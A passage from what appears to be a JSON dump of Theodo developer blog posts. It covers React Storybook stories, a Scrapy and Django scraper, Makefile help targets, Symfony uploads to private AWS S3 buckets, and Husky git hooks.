Native here at Theodo. I hope I will on the next applicable project to test out this exciting new tech.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAbbie Howell\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA year ago I was a young developer starting his journey on React. My client came to see my team and told us: \u201cWe need to make reusable components\u201d, I asked him: \u201cWhat is a reusable component?\u201d and the answer was \u201cThis project is a pilot on the subject\u201d.\n2 months later another developer tried to use our components and the disillusion started: despite our efforts, our component were not reusable\u00a0\ud83d\ude31\nAt the time we managed to work with him to improve our code so that he could use it, but how could we have avoided the problem?\nThe answer was given to me by Florian Rival, a former developer at Bam, now working for Facebook: Storybook !\n Storybook, what is that?\nIt is an open source visual documentation software (here is the repo). It allows you to display the different states of your component. The cluster of all the different cases for your component are called the component stories.\nThis allows you to visually describe your components : anyone who wants to use your components can just look at your stories and see how to use it. No need to dig in the code to find all the use cases, they are all there!\nA picture is worth a thousand words,\u00a0so just check the best example I know, the open Storybook of Airbnb.\nOne interesting thing to\u00a0note is that it\u2019s working with Vue, Angular and React!\nUsage example\nLet\u2019s make an example to explain this better to you. I will use a react todo list, I started with the one on this repo.\nThen I added Storybook to the project, I won\u2019t detail this part as the\u00a0Storybook doc\u00a0is very good. I would say it takes approximately 20 minutes to add storybook to your project, but might take longer to properly setup your asset builder.\nNow I\u2019ll focus on the component FilteredList that display the todos, first it looked like this:\n\r\nimport React from 'react';\r\nimport styled from 'styled-components';\r\nimport TodoItem from './TodoItem';\r\n\r\nconst StyledUl = styled.ul`\r\n  list-style: none;\r\n`;\r\n\r\nconst StyledP = styled.p`\r\n  margin: 10px 0;\r\n  padding: 10px;\r\n  border-radius: 0;\r\n  background: #f2f2f2;\r\n  border: 1px solid rgba(229, 229, 229, 0.5);\r\n  color: #888;\r\n`;\r\n\r\nexport default function FilteredList(props) {\r\n    const {items, changeStatus} = props;\r\n\r\n    if (items.length === 0) {\r\n        return (\r\n            <StyledP>There are no items.</StyledP>\r\n        );\r\n    }\r\n\r\n    return (\r\n        <StyledUl>\r\n            {items.map(item => (\r\n                <TodoItem key={item.id} data={item} changeStatus={changeStatus}/>\r\n            ))}\r\n        </StyledUl>\r\n    );\r\n}\r\n\n(It is not exactly the same as the one on the repo, I\u00a0used styled-component instead of plain css)\nTodoItem is the component that displays an element of the list.\nHere we can see there are two different branches in the render: the nominal case and the empty state.\nLet\u2019s write some stories, I created a file FilteredList.stories.js\u00a0and added this inside:\n\r\nimport React from 'react';\r\nimport { storiesOf } from '@storybook/react';\r\nimport FilteredList from \"./FilteredList\";\r\n\r\nconst data = [{\r\n    id: 1,\r\n    completed: true,\r\n    text: 'Jean-Claude Van Damme'\r\n}];\r\n\r\nstoriesOf('FilteredList')\r\n    .add('Nominal usage', () => (\r\n        <FilteredList items={data} changeMode={() => void 0}/>\r\n    ))\r\n    .add('Empty state', () => (\r\n        <FilteredList items={[]} changeMode={() => void 0}/>\r\n    ));\r\n\nSo what did I do here?\nI defined placeholder data in a variable for the component props.\nWe use the function storiesOf\u00a0from storybook, this function takes the name we want to give to the group of stories as entry param.\nThen we add some stories with .add. It\u00a0works pretty much\u00a0like jest or mocha\u2019s\u00a0describe or\u00a0it\u00a0in tests, it takes the name of the story and a function that returns the component to render.\nHere\u2019s what it looks like:\n\n\nIt\u2019s rather simple but it\u2019s working, we see the two different cases.\nWhat if we add other branches? Let\u2019s say the parent component of FilteredList\u00a0is calling an API to get the list and so we have to add a loading and error state.\n\r\nexport default function FilteredList(props) {\r\n    const {items, changeStatus, isLoading, error} = props;\r\n\r\n    if (isLoading) {\r\n        return (\r\n            <StyledP>Loading...</StyledP>\r\n        )\r\n    }\r\n\r\n    if (error) {\r\n        return (\r\n            <StyledP>Sorry an error occurred with the following message: {error}</StyledP>\r\n        )\r\n    }\r\n    \r\n    //...\r\n}\r\n\nNow we need to add the corresponding stories.\n\r\n.add('Loading state', () => (\r\n        <FilteredList items={[]} changeMode={() => void 0} isLoading />\r\n))\r\n.add('Error state', () => (\r\n    <FilteredList items={[]} changeMode={() => void 0} error=\"Internal server error\"/>\r\n));\r\n\nAnd now our Storybook looks like:\n\n\nThis example is rather simple but it shows pretty well how we worked with Storybook. Each time you create new component behaviors you then create the corresponding stories.\nAin\u2019t nobody got time for that?\nIn fact it takes time when you are coding but I feel like it is more like an investment.\nWhen you develop your app\u00a0aren\u2019t you trying to make it easy to use? Then why not make it easy for developers to use your code?\nAnd that\u2019s where Storybook is helping you, now your components are easier to share, this leads to a better collaboration between developers and therefore to better component development practices shared inside the team.\nThis is very important because you are not the only user of your code, you might be working with a team or someone else will\u00a0take over\u00a0your project afterwards.\nWe all had this part in our project code that have been here for ages and no one really know how to deal with it, how to avoid that? Make it good the first time you code it! Seems obvious but still is right, and for that you can use Storybook to share your front end components and make perfect APIs! (or at least very good ones)\nFinal thoughts\nIn a way we are all trying to do reusable components \u2013 whether you are trying to do a library or not, you want other members of your team to be able to update/fix your code. It\u2019s not easy to make perfect APIs for your components if you can not have a lot of user feedback and that\u2019s why Storybook or any visual doc are so efficient. They improve greatly the vision others have of your component and help them modify it without breaking anything.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tL\u00e9o Anesi\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you already know what scraping is, you can directly jump to how I did it\nWhat is scraping?\nScraping is the process of data mining. Also known as web data extraction, web harvesting, spying.. It is software that simulates human interaction with a web page to retrieve any wanted information (eg images, text, videos). This is done by a scraper.\nThis scraper involves making a GET request to a website and parsing the html response. The scraper then searches for the data required within the html and repeats the process until we have collected all the data we want.\nIt is useful for quickly accessing and analysing large amounts of data, which can be stored in a CSV file, or in a database depending on our needs!\nThere are many reasons to do web scraping such as lead generation and market analysis. However, when scraping websites, you must always be careful not to violate the terms and conditions of websites you are scraping, or to violate anyone\u2019s privacy. This is why it is thought to be a little controversial but can save many hours of searching through sites, and logging the data manually. All of those hours saved mean a great deal of money saved.\nThere are many different libraries that can be used for web scraping, e.g. selenium, phantomjs.\u00a0In Ruby you can also use the nokogiri gem to write your own ruby based scraper. Another popular library is is beautiful soup which is popular among python devs.\nAt Theodo, we needed to use a web scraping tool with the ability to follow links and as python developers the solution we opted for was using theDjango framework with an open source web scraping framework called\u00a0Scrapy.\nScrapy and Django\nScrapy allows us to define data structures, write data extractors, and comes with built in CSS and xpath selectors that we can use to extract the data, the scrapy shell, and built in JSON, CSV, and XML output. There is also a built in FormRequest class which allows you to mock login and is easy to use out of the box.\nWebsites tend to have countermeasures to prevent excessive requests, so Scrapy randomises the time between each request by default which can help avoid getting banned from them. Scrapy can also be used for automated testing and monitoring.\nDjango has an integrated admin which makes it easy to access the db. That along with the ease of filtering and sorting data and import/export library to allow us to export data.\nScrapy also used to have a built in class called DjangoItem which is now an easy to use external library. The DjangoItem library provides us with a class of item that uses the field defined in a Django model just by specifying which model it is related to. The class also provides a method to create and populate the Django model instance with the item data from the pipeline. This library allows us to integrate Scrapy and Django easily and means we can also have access to all the data directly in the admin!\nSo what happens?\n\u00a0\nSpiders\nLet\u2019s start from the spider. Spiders are the core of the scraper. It makes the request to our defined URLs, parses the responses, and extracts information from them to be processed in the items.\nScrapy has a start_requests method which generates a request with the URL. When Scrapy fetches a website according to the request, it will parse the response to a callback method specified in the request object. The callback method can generate an item from the response data or generate another request.\nWhat happens behind the scenes? Everytime we start a Scrapy task, we start a crawler to do it. The Spider defines how to perform the crawl (ie following links). The crawler has an engine to drive it\u2019s flow. When a crawler starts, it will get the spider from its queue, which means the crawler can have more than one spider. The next spider will then be started by the crawler and scheduled to crawl the webpage by the engine. The engine middlewares drive the flow of the crawler. The middlewares are organised in chains to process requests and responses.\nSelectors\nSelectors can be use to parse a web page to generate an item. They select parts of the html document specified either by xpath or css expressions. Xpath selects nodes in XML docs (that can also be used in HTML docs) and CSS is a language for applying styles to HTML documents. CSS selectors use the HTML classes and id tag names to select the data within the tags. Scrapy in the background using the cssselect library transforms these CSS selectors into xpath selectors.\nCSS vs Xpath\n\r\n        data = response.css(\"div.st-about-employee-pop-up\") \r\n        data = response.xpath(\"//div[@class='team-popup-wrap st-about-employee-pop-up']\")\r\n\nShort but sweet: when dealing with classes, ids and tag names, use CSS selectors. If you have no class name and just know the content of the tag use xpath selectors. Either way chrome dev tools can help: copy selector for the element\u2019s unique css selector or you can copy its xpath selector. This is to give a basis, may have to tweak it! Two more helper tools are XPath helper and this cheatsheet. Selectors are also chainable.\nItems and Pipeline\nItems produce the output. They are used to structure the data parsed by the spider. The Item Pipeline is where the data is processed once the items have been extracted from the spiders. Here we can run tasks such as validation and storing items in a database.\nHow I did it\nHere\u2019s an example of how we can integrate Scrapy and Django. Let\u2019s scrape the data off the Theodo UK Team Page and integrate it into a Django Admin Panel:\n\nGenerate Django project with integrated admin + db\nCreate a django project, with admin and database\nCreate app and add to installed apps\nDefine the data structure, so the item, so our django model.\n## models.py\r\n      from django.db import model\r\n\r\n      class TheodoTeam(models.Model):\r\n        name = models.CharField(max_length=150)\r\n        image = models.CharField(max_length=150)\r\n        fun_fact = models.TextField(blank=True)\r\n\r\n        class Meta:\r\n            verbose_name = \"theodo UK team\"\r\n      \n\nInstall Scrapy\nRun\nscrapy startproject scraper\n\nConnect using DjangoItem\n    ## items.py\r\n      from scrapy_djangoitem import DjangoItem\r\n      from theodo_team.models import TheodoTeam\r\n\r\n      class TheodoTeamItem(DjangoItem):\r\n        django_model = TheodoTeam\r\n    \n\nThe Spider \u2013 Spiders have a starturls class which takes a list of URLs. The URLs will then be used by the startrequests method to create the initial requests for your spider. Then using the response and selectors, select the data required.\nimport scrapy\r\n    from scraper.items import TheodoTeamItem\r\n\r\n    class TheodoSpider(scrapy.Spider):\r\n      name = \"theodo\"\r\n      start_urls = [\"https://www.theodo.co.uk/team\"]\r\n\r\n      # this is what start_urls does\r\n      # def start_requests(self):\r\n      #     urls = ['https://www.theodo.co.uk/team',]\r\n      #     for url in urls:\r\n      #       yield scrapy.Request(url=url, callback=self.parse)\r\n\r\n      def parse(self, response):\r\n          data = response.css(\"div.st-about-employee-pop-up\")\r\n\r\n          for line in data:\r\n              item = TheodoTeamItem()\r\n              item[\"name\"] = line.css(\"div.h3 h3::text\").extract_first()\r\n              item[\"image\"] = line.css(\"img.img-team-popup::attr(src)\").extract_first()\r\n              item[\"fun_fact\"] = line.css(\"div.p-small p::text\").extract().pop()\r\n              yield item\r\n    \n\nPipeline \u2013 use it to save the items to the database\n## pipelines.py\r\n    class TheodoTeamPipeline(object):\r\n      def process_item(self, item, spider):\r\n          item.save()\r\n          return item\r\n    \n\nCreate a Django command to run Scrapy crawl \u2013 This initialises django in the scraper and is needed to be able to access django in the spider.\n## commands/crawl.py\r\n\r\n    from django.core.management.base import BaseCommand\r\n    from scraper.spiders import TheodoSpider\r\n    from scrapy.crawler import CrawlerProcess\r\n    from scrapy.utils.project import get_project_settings\r\n\r\n    class Command(BaseCommand):\r\n      help = \"Release the spiders\"\r\n\r\n      def handle(self, *args, **options):\r\n          process = CrawlerProcess(get_project_settings())\r\n\r\n          process.crawl(TheodoSpider)\r\n          process.start()\r\n    \n\nRun manage.py crawl to save the items to the database\n\nProject Structure:\n scraper\r\n     management\r\n         commands\r\n             crawl.py\r\n     spiders\r\n         theodo_team_spider.py\r\n         apps.py\r\n         items.py\r\n         middlewares.py\r\n         pipelines.py\r\n         settings.py\r\n theodo_team\r\n     admin\r\n     migrations\r\n     models\r\n\nChallenges and problems encountered:\nSelectors!! Selectors are not one size fits all. Different selectors are needed for every website and if there is constant layout changes, they require upkeep. It can also be difficult to find all the data required without manipulating it. This occurs when tags may not have a class name or if data is not consistently stored in the same tag.\nAn example of how complicated selectors can get:\nsegments = response.css(\"tr td[rowspan]\")\r\nrowspan = int(segment.css(\"::attr(rowspan)\").extract_first())\r\n           all_td_after_segment = segment.xpath(\"./../following-sibling::tr[position()<={}]/td\".format(rowspan- 1))\r\n\r\nline = all_td_after_segment.extract_first()\r\ndata = line.xpath(\"./descendant-or-self::a/text()\")\r\nmore_data = line.xpath(\"substring-after(substring-before(./strong/text()[preceding-sibling::a], '%'), '\\xa0')\").extract_first()\r\n\nAs you can see, setting up the scraper is not the hard part! I think integrating Scrapy and Django is a desirable, efficient and speedy solution to be able to store data from a website into a database.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tHenriette Brand\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tFor one of Theodo\u2019s clients, we built a complex website including a catalog, account management and the availability to order products.\nAs a result, the project was complex, with several languages (symfony, vue, javascript), utilities (docker, aws, webpack) and microservices (for the search of products, the management of accounts, the orders).\nThe impact of this complexity for the development teams was the numerous commands they had to use every day, and particularly to install the project.\nThus, and following Symfony 4 best practices, we decided to use make\u00a0on the project to solve these problems.\nAnd it worked!\nWhat is make\nMake is a build automation tool created in 1976, designed to solve dependency problems of the build process.\nIt was originally used to get compiled files from source code, for instance for C language.\nIn website development, an equivalent could be the installation of a project and its dependencies from the source code.\nLet me introduce a few concepts about make that we will need after.\nMake reads a descriptive file called Makefile, to build a target, executing some commands, and depending on a prerequisite.\nThe architecture of the Makefile is the following:\n\r\ntarget: [prerequisite]\r\n    command1\r\n    [command2]\r\n\nAnd you run make target in your terminal to execute the target\u00a0commands. Simple, right?\nUse it for project installation\nWhat is mainly used to help project installation is a README describing the several commands you need to run to get your project installed.\nWhat if all these commands were executed by running make install?\nYou would have your project working with one command, and no documentation to maintain anymore.\nI will only describe a simple way to build dependencies from your composer.json file\n\r\nvendor: composer.json\r\n    composer install\r\n\nThis snippet will build the vendor directory, running composer install, only if the vendor directory does not exist. Or if composer.json file has changed since the last time you built the vendor directory.\nNote that if you don\u2019t want to check the existency of a directory or a file named as your target, you can use a Phony Target. It means adding the line .PHONY: target to your Makefile.\nThere is much more you can do, and I won\u2019t talk about it here.\nBut if you want a nice example to convert an installation README\u00a0into a Makefile, you can have a look at these slides,\u00a0that are coming from a talk at Paris Symfony Live 2018.\nUse it for the commonly used commands you need on your project\nAfter the project installation, a complexity for the developer is to find the commands needed to develop features locally.\nWe decided to create a Makefile\u00a0to gather all the useful commands we use in the project on a daily basis.\nWhat are the advantages of this:\n\nThe commands are committed and versioned\nAll developers of the team are using the same, reviewed commands. -> there is no risk to forget one thing before executing a command line and break something\nIt is language agnostic -> which means you can start php jobs, javascript builds, docker commands, \u2026\nIt\u2019s well integrated with the OS -> for instance there is autocompletion for targets and even for options\nYou can use it for continuous improvement -> when a command fails for one dev, modify that command and commit the new version. It will never fail anymore!\n\nAuto-generate a help target\nBut after a long time, we started having a lot of commands.\nIt was painful to find the one you wanted in the file, and even to know the one that existed\nSo we added a new target help, in order to automatically generate a list of available commands from the comments in the Makefile.\nThe initial snippet we used is:\n\r\n.DEFAULT_GOAL := help\r\nhelp:\r\n    @grep -E '(^[a-zA-Z_-]+:.*?##.*$$)|(^##)' $(MAKEFILE_LIST) | awk 'BEGIN {FS = \":.*?## \"}{printf \"\\033[32m%-30s\\033[0m %s\\n\", $$1, $$2}' | sed -e 's/\\[32m##/[33m/'\r\n\nIf you add the following target and comments in your Makefile:\n\r\n## Example section\r\nexample_target: ## Description for example target\r\n        @does something\r\n\nIt would give this help message:\n\nThis generic, reusable snippet has another advantage: the documentation it generates is always up to date!\nAnd you can customize it to your need, for instance to display options associated to your commands.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMartin Guillier\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy?\nAdding upload fields in Symfony application eases the way of managing assets. It makes it possible to upload public assets as well as sensitive documents instantly without any devops knowledge. Hence, I\u2019ll show you a way of implementing a Symfony / Amazon AWS architecture to store your documents in the cloud.\nSetup Symfony and AWS\nFirst you need to setup both Symfony and AWS to start storing some files from Symfony in AWS buckets.\nAmazon AWS\nCreating a bucket on Amazon AWS is really straight forward. First you need to sign up on Amazon S3 (http://aws.amazon.com/s3). Go to the AWS console and search S3. Then click on Create a bucket.\nFollow bucket creation process choosing default values (unless you purposely want to give public access to your documents, you should keep your bucket private). Eventually create a directory for each of your environments. Your AWS S3 bucket is now ready to store your documents.\nSymfony\nNow you need to setup Symfony to be able to store files and to communicate with Amazon AWS. You will need 2 bundles and 1 SDK to set it up:\n\nVichUploader (a bundle that will ease files upload)\nKNP/Gauffrette (a bundle that will provide an abstraction layer to use uploaded files in your Symfony application without requiring to know where those files are actually stored)\nAWS-SDK (A SDK provided by Amazon to communicate with AWS API)\n\nInstall the two bundles and the SDK with composer:\n\r\ncomposer require vich/uploader-bundle\r\ncomposer require aws/aws-sdk-php\r\ncomposer require knplabs/knp-gaufrette-bundle\r\n\r\n\nThen register the bundles in AppKernel.php\n\r\npublic function registerBundles()\r\n    {\r\n     return [\r\n            \tnew Vich\\UploaderBundle\\VichUploaderBundle(),\r\n            \tnew Knp\\Bundle\\GaufretteBundle\\KnpGaufretteBundle(),\r\n            ];\r\n    }\r\n\r\n\nBucket parameters\nIt is highly recommended to use environment variables to store your buckets parameters and credentials. It will make it possible to use different buckets depending on your environment and will prevent credentials from being stored in version control system. Hence, you won\u2019t pollute your production buckets with test files generated in development environment.\nYou will need to define four parameters to get access to your AWS bucket:\n\nAWS_BUCKET_NAME\nAWS_BASE_URL\nAWS_KEY (only for and private buckets)\nAWS_SECRET_KEY (only for and private buckets)\n\nYou can find the values of these parameters in your AWS console.\nConfiguration\nYou will have to define a service extending Amazon AWS client and using your AWS credentials.\nAdd this service in services.yml:\n\r\nct_file_store.s3:\r\n        class: Aws\\S3\\S3Client\r\n        factory: [Aws\\S3\\S3Client, 'factory']\r\n        arguments:\r\n            -\r\n                version: YOUR_AWS_S3_VERSION (to be found in AWS console depending on your bucket region and version)\r\n                region: YOUR_AWS_S3_REGION\r\n                credentials:\r\n                    key: '%env(AWS_KEY)%'\r\n                    secret: '%env(AWS_SECRET_KEY)%'\r\n\r\n\nNow you need to configure VichUploader and KNP_Gaufrette in Symfony/app/config/config.yml. Use the parameters previously stored in your environment variables.\nHere is a basic example:\n\r\nknp_gaufrette:\r\n    stream_wrapper: ~\r\n    adapters:\r\n        document_adapter:\r\n            aws_s3:\r\n                service_id: ct_file_store.s3\r\n                bucket_name: '%env(AWS_BUCKET_NAME)%'\r\n                detect_content_type: true\r\n                options:\r\n                    create: true\r\n                    directory: document\r\n    filesystems:\r\n        document_fs:\r\n            adapter:    document_adapter\r\n\r\nvich_uploader:\r\n    db_driver: orm\r\n    storage: gaufrette\r\n    mappings:\r\n        document:\r\n            inject_on_load: true\r\n            uri_prefix: \"%env(AWS_BASE_URL)%/%env(AWS_BUCKET_NAME)%/document\"\r\n            upload_destination: document_fs\r\n            delete_on_update:   false\r\n            delete_on_remove:   false \r\n\r\n\nUpload files\nFirst step in our workflow is to upload a file from Symfony to AWS. You should create an entity to store your uploaded document (getters and setters are omitted for clarity, you will need to generate them).\nThe attribute mapping in $documentFile property annotation corresponds to the mapping defined in config.yml. Don\u2019t forget the class attribute @Vich\\Uploadable().\n\r\nnamespace MyBundle\\Entity;\r\n\r\nuse Doctrine\\ORM\\Mapping as ORM;\r\nuse Symfony\\Component\\HttpFoundation\\File\\File;\r\nuse Vich\\UploaderBundle\\Mapping\\Annotation as Vich;\r\n\r\n/**\r\n * Class Document\r\n *\r\n * @ORM\\Table(name=\"document\")\r\n * @ORM\\Entity()\r\n * @Vich\\Uploadable()\r\n */\r\nclass Document\r\n{\r\n    /**\r\n     * @var int\r\n     *\r\n     * @ORM\\Column(type=\"integer\", name=\"id\")\r\n     * @ORM\\Id\r\n     * @ORM\\GeneratedValue(strategy=\"AUTO\")\r\n     */\r\n    private $id;\r\n\r\n    /**\r\n     * @var string\r\n     *\r\n     * @ORM\\Column(type=\"string\", length=255, nullable=true)\r\n     */\r\n    private $documentFileName;\r\n\r\n    /**\r\n     * @var File\r\n     * @Vich\\UploadableField(mapping=\"document\", fileNameProperty=\"documentFileName\")\r\n     */\r\n    private $documentFile;\r\n\r\n    /**\r\n     * @var \\DateTime\r\n     *\r\n     * @ORM\\Column(type=\"datetime\")\r\n     */\r\n    private $updatedAt;\r\n}\r\n\r\n\nThen you can add an uploaded document to any of your entities:\n\r\n     /**\r\n     * @var Document\r\n     *\r\n     * @ORM\\OneToOne(\r\n     *     targetEntity=\"\\MyBundle\\Entity\\Document\",\r\n     *     orphanRemoval=true,\r\n     *     cascade={\"persist\", \"remove\"},\r\n     * )\r\n     * @ORM\\JoinColumn(name=\"document_file_id\", referencedColumnName=\"id\", onDelete=\"SET NULL\")\r\n     */\r\n    private $myDocument;\r\n\r\n\nCreate a form type to be able to upload a document:\n\r\nclass UploadDocumentType extends AbstractType\r\n{\r\n    public function buildForm(FormBuilderInterface $builder, array $options)\r\n    {\r\n        add('myDocument', VichFileType::class, [\r\n                'label'         => false,\r\n                'required'      => false,\r\n                'allow_delete'  => false,\r\n                'download_link' => true,\r\n            ]);\r\n    }\r\n...\r\n}\r\n\r\n\nUse this form type in your controller and pass the form to the twig:\n\r\n...\r\n$myEntity = new MyEntity();\r\n$form = $this->createForm(UploadDocumentType::class, $myEntity);\r\n...\r\nreturn [ 'form' => $form->createView()];\r\n\r\n\nFinally, add this form field in your twig and you should see an upload field in your form:\n\r\n<div class=\"row\">\r\n    <div class=\"col-xs-4\">\r\n        {{ form_label(form.myDocument) }}\r\n    </div>\r\n    <div class=\"col-xs-8\">\r\n        {{ form_widget(form.myDocument) }}\r\n    </div>\r\n    <div class=\"col-xs-8 col-xs-offset-4\">\r\n        {{ form_errors(form.myDocument) }}\r\n    </div>\r\n</div>\r\n\r\n\nNavigate to your page, upload a file and submit your form. You should now be able to see this document in your AWS bucket.\nUsers are now able to upload files on your Symfony application and these documents are safely stored on Amazon AWS S3 bucket. The next step is to provide a way to download and display these documents from AWS in your Symfony application.\nDisplay or download documents stored in private buckets\nIn most cases, your files are stored in private buckets. Here is a step by step way to safely give access to these documents to your users.\nGet your document from private bucket\nYou will need a method to retrieve your files from your private bucket and display it on a custom route. As a result, users will never see the actual route used to download the file. You should define this method in a separate service and use it in the controller.\ns3Client is the service (ct_file_store.s3) we defined previously extending AWS S3 client with credentials for private bucket. You will need to inject your bucket name from your environment variables in this service. my-documents/ is the folder you created to store your documents.\n\r\n     /**\r\n     * @param string $documentName\r\n     *\r\n     * @return \\Aws\\Result|bool\r\n     */\r\n    public function getDocumentFromPrivateBucket($documentName)\r\n    {\r\n        try {\r\n            return $this->s3Client->getObject(\r\n                [\r\n                    'Bucket' => $this->privateBucketName,\r\n                    'Key'    => 'my-documents/'.$documentName,\r\n                ]\r\n            );\r\n        } catch (S3Exception $e) {\r\n            // Handle your exception here\r\n        }\r\n    }\r\n\r\n\nDefine an action with a custom route:\nYou will need to use the method previously defined to download the file from AWS and expose it on a custom route.\n\r\n     /**\r\n     * @param Document $document\r\n     * @Route(\"/{id}/download-document\", name=\"download_document\")\r\n     * @return RedirectResponse|Response\r\n     */\r\n    public function downloadDocumentAction(Document $document)\r\n    {\r\n        $awsS3Uploader  = $this->get('app.service.s3_uploader');\r\n\r\n        $result = $awsS3Uploader->getDocumentOnPrivateBucket($document->getDocumentFileName());\r\n\r\n        if ($result) {\r\n            // Display the object in the browser\r\n            header(\"Content-Type: {$result['ContentType']}\");\r\n            echo $result['Body'];\r\n\r\n            return new Response();\r\n        }\r\n\r\n        return new Response('', 404);\r\n    }\r\n\r\n\nDownload document\nEventually add a download button to access a document stored in a private bucket directly in your Symfony application.\n\r\n<a href=\"{{ path('/download-document', {'id': document.id}) }}\" \r\n                   target=\"_blank\">\r\n   <i class=\"fa fa-print\">\r\n   {{ 'label_document_download'|trans }}\r\n</a>\r\n\r\n\nPublic assets\nYou may want to display some assets from Amazon AWS in public pages of your application. To do so, use a public bucket to upload these assets. It is quite straight forward to access it to display them. Be conscious that anyone will be able to access these files outside your application.\n\r\n<img src=\"{{ vich_uploader_asset(myEntity.myDocument, 'documentFile') }}\" alt=\"\" />\r\n\r\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlan Rauzier\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\ttl:dr\nTo add a pre-commit git hook with Husky:\n\nInstall Husky with npm install husky --save-dev\nSet the pre-commit command in your package.json:\n\n\"scripts\": {\r\n    \"precommit\": \"npm test\"\r\n},\r\n\nWhat are git hooks?\nGit hooks are scripts launched when carrying out some git actions. The most common one is the pre-commit hook that\u00a0runs when performing git commit, before the commit is actually created.\nThe scripts are located in the .git/hooks folder. Check out the\u00a0.sample file examples in your local git repository.\n\nWhy do I need to install the Husky\u00a0package then?\nThe problem with git hooks is that they are in the .git directory, which means that they are not committed hence not shared between developers.\nHusky takes care of this: when a developer runs npm install, it will automatically create the scripts in .git/hooks:\n\nTheses scripts will parse your package.json and run the associated command. For example, the pre-commit script will run the npm run precommit command\n\"scripts\": {\r\n    \"precommit\": \"npm test\"\r\n},\r\n\nTo add husky to your project, simply run npm install husky --save-dev.\nFor more complex commands, I recommend to use a separate bash script :\u00a0\"precommit\": \"bash ./scripts/check-lint.sh\".\nEnhancing your git flow\nGit hooks are a convenient way to automate tasks during your git flow and protect you from pushing unwanted code by mistake.\n\nCheck for linting errors\n\nIf you have tools to check the code quality or formatting, you can run it on a pre-commit hook:\n\"scripts\": {\r\n    \"precommit\": \"prettier-check \\\"**/*.js\\\" && eslint . --quiet\"\r\n},\r\n\nI advise to run those tests on your CI tool as well, but checking it on a precommit hook can make you\u00a0save a lot of time as you won\u2019t have to wait for your CI to set up your whole project and fail only because you forgot a\u00a0semicolon.\n\nProtect important branches\n\nIn some rare situations, you have to push code directly on a branch that is deployed. One way to protect\u00a0it from developers in a hurry who forget to run the tests locally is to launch them on a pre-push hook:\n\"scripts\": {\r\n    \"prepush\": \"./scripts/pre-push-check.sh\"\r\n},\r\n\n\n#!/bin/bash\r\nset -e\r\n\r\nbranch=$(git branch | sed -n -e 's/^\\* \\(.*\\)/\\1/p')\r\nif [ \"$branch\" == \"master\" ]\r\nthen\r\n    npm test\r\nfi\r\n\n\nIf your tests fail, the code won\u2019t be pushed.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tHugo Lime\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo.\r\n\r\nPassionate about new technologies to make web apps stronger and faster.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
